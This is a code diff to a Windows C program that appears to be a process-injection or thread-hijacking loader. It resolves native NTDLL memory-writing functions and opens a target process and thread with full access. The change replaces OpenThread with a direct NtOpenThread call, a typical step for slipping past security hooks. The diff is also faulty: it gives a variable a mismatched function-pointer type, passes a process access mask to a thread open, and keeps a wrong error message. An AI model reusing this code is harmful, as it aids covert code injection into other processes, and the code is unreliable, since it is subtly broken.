@@ -75,6 +75,7 @@ int wmain() {
 	// Get syscall address
 	fnNtQuerySystemInformation	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
 	fnNtOpenProcess				pNtOpenProcess = (fnNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
+	fnNtOpenProcess				pNtOpenThread = (fnNtOpenThread)GetProcAddress(hNtdll, "NtOpenThread");
 	fnNtAllocateVirtualMemory	pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
 	fnNtProtectVirtualMemory	pNtProtectVirtualMemory = (fnNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
 	fnNtWriteVirtualMemory		pNtWriteVirtualMemory = (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
@@ -120,6 +121,7 @@ int wmain() {
 			ClientId.UniqueProcess = (HANDLE)(ULONG_PTR) dwProcessId;
 			ClientId.UniqueThread = dwThreadId;
 
+			// Run NtOpenProcess
 			STATUS = pNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId);
 			if (STATUS != 0x0) {
 				printf("[!] NtOpenProcess Failed With Error : 0x%0.8X \n", STATUS);
@@ -127,7 +129,13 @@ int wmain() {
 			}
 			if (hProcess == NULL)
                 printf("\n\t[!] OpenProcess Failed With Error : %d \n", GetLastError());
-            hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, dwThreadId);
+
+			// Run NtOpenThread
+			STATUS = pNtOpenThread(&hThread, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId);
+			if (STATUS != 0x0) {
+				printf("[!] NtOpenProcess Failed With Error : 0x%0.8X \n", STATUS);
+				return FALSE;
+			}
             if (hThread == NULL)
                 printf("\n\t[!] OpenThread Failed With Error : %d \n", GetLastError());
             break;
